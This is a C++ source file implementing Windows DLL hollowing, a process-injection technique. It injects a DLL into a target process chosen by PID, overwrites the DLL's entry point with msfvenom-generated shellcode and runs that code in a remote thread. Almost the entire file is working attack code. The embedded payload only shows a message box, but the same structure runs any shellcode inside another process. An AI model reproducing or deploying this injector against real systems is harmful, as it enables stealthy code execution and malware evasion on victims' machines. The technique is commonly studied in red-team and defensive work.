// RemoteThread.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "pch.h"
#include <iostream>
#include <psapi.h>


int Error(const char* text) {
	printf("%s (%u)\n", text, GetLastError());
	return 1;
}

int main(int argc, const char* argv[]) {

	HMODULE modules[256] = {};
	DWORD modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	CHAR remoteModuleName[128] = {};
	HMODULE remoteModule = NULL;

	/* payload
	$ msfvenom - p windows / x64 / messagebox TEXT = "DLL Hollowing" TITLE = "DLL Hollowing FTW!" - f c
		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
		[-] No arch selected, selecting arch : x64 from the payload
		No encoder or badchars specified, outputting raw payload
		Payload size : 300 bytes
		Final size of c file : 1284 bytes
	*/
		unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
		"\x85\x0c\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x44\x4c\x4c"
		"\x20\x48\x6f\x6c\x6c\x6f\x77\x69\x6e\x67\x00\x44\x4c\x4c\x20"
		"\x48\x6f\x6c\x6c\x6f\x77\x69\x6e\x67\x20\x46\x54\x57\x21\x00";


	if (argc < 3) {
		printf("Usage: DLL Hollowing <pid> <dllpath>\n");
		return 0;
	}

	int pid = atoi(argv[1]);
//	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid);
//  Ponemos permisos PROCESS_ALL_ACCESS porque con los permisos de la instrucción anterior no puede enumerar moduloes. Necesario más adelante
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!hProcess)
		return Error("Failed to open process");

	void* buffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer)
		return Error("Failed to allocate memory");

	if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), nullptr))
		return Error("Failed in WriteProcessMemory");

	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"),
		buffer, 0, nullptr);
	if (!hThread)
		return Error("Failed to create remote thread");

	printf("Remote thread created successfully!\n");
	WaitForSingleObject(hThread, 1000);

	printf("Waiting 10 seconds before performing DLL Hollowing\n");
	Sleep(10000);
/* Hollowing */
		// find base address of the injected benign DLL in remote process
	printf("Hollowing initiated!\n");
	if (!EnumProcessModules(hProcess, modules, modulesSize, &modulesSizeNeeded))
		return Error("Failed to enumerate process modules");
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
//	printf("modulesCount: %lld", modulesCount);
	for (size_t i = 0; i < modulesCount; i++)
	{
		remoteModule = modules[i];
		GetModuleBaseNameA(hProcess, remoteModule, remoteModuleName, sizeof(remoteModuleName));
		//printf("Remote module: %s", remoteModuleName);
		if (std::string(remoteModuleName).compare("Injected.dll") == 0)
		{
			printf("Module found!\n");
			std::cout << remoteModuleName << " at " << modules[i];
			break;
		}
	}

	// get DLL's AddressOfEntryPoint
	DWORD headerBufferSize = 0x1000;
	LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
	ReadProcessMemory(hProcess, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
	LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
	std::cout << ", entryPoint at " << dllEntryPoint;

	// write shellcode to DLL's AddressofEntryPoint
	WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);

	// execute shellcode from inside the benign DLL
	CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);



	VirtualFreeEx(hProcess, buffer, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return 0;
}

